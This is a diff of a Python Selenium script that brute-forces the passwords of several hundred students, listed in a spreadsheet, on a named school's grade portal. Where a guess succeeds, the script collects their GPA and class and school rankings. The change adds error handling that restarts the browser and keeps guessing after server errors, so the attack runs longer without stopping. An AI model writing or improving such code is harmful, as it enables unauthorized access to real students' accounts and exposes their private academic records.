@@ -5,16 +5,17 @@ from selenium.webdriver.chrome.options import Options
 import openpyxl
 from pathlib import Path
 from datetime import date, timedelta
+import time
 
 # Setting the path to the xlsx file:
 xlsx_file = Path('A:/Documents/GitHub/Just-Try-A-Project/M6(2564).xlsx')
 wb_obj = openpyxl.load_workbook(xlsx_file)
 sheet = wb_obj.active
 
-for student in range(57,634):
+for student in range(4,634):
     # เก็บข้อมูลนักเรียน
     usr = sheet[f"B{student}"].value
-    print(f"🧑🏻 UID: {usr} 👧🏻")
+    print(f"🧑🏻UID: {usr} ")
 
     URL = [
     "https://academic.skr.ac.th/grade/2564/1/",
@@ -69,15 +70,28 @@ for student in range(57,634):
                     CLASS_RATING = "ERROR"
                     SCHOOL_RATING = "ERROR"
                     stop_random += 1
-                    if stop_random >= 731:
-                        print(f"❌ Password not found ❌")
-                        GPA = "NOT FOUND"
-                        CLASS_RATING = "NOT FOUND"
-                        SCHOOL_RATING = "NOT FOUND"
-                        pwd = "NOT FOUND"
-                        break
-                    print(f"❌ {pwd}")
-                    continue
+                    try : # ถ้าเจอ SERVER ERROR
+                        SERVER_ERROR = driver.find_element_by_xpath('/html/body/span/h1/text()').text # ตอนนี้มันไม่เจอ
+                        print(SERVER_ERROR)
+                        print("⚠ SERVER ERROR ⚠")
+                        GPA = "SERVER ERROR"
+                        CLASS_RATING = "SERVER ERROR"
+                        SCHOOL_RATING = "SERVER ERROR"
+                        driver.quit()
+                        stop_random = 0
+                        time.sleep(5)
+                        driver = webdriver.Chrome(ChromeDriverManager().install())
+                        driver.get(URL[i])
+                    except: # ถ้าไม่เจอ
+                        if stop_random >= 731:
+                            print(f"❌ Password not found ❌")
+                            GPA = "NOT FOUND"
+                            CLASS_RATING = "NOT FOUND"
+                            SCHOOL_RATING = "NOT FOUND"
+                            pwd = "NOT FOUND"
+                            break
+                        print(f"❌ {pwd}")
+                        continue
                 
         elif found_pass == 1: # มีรหัส
             try:
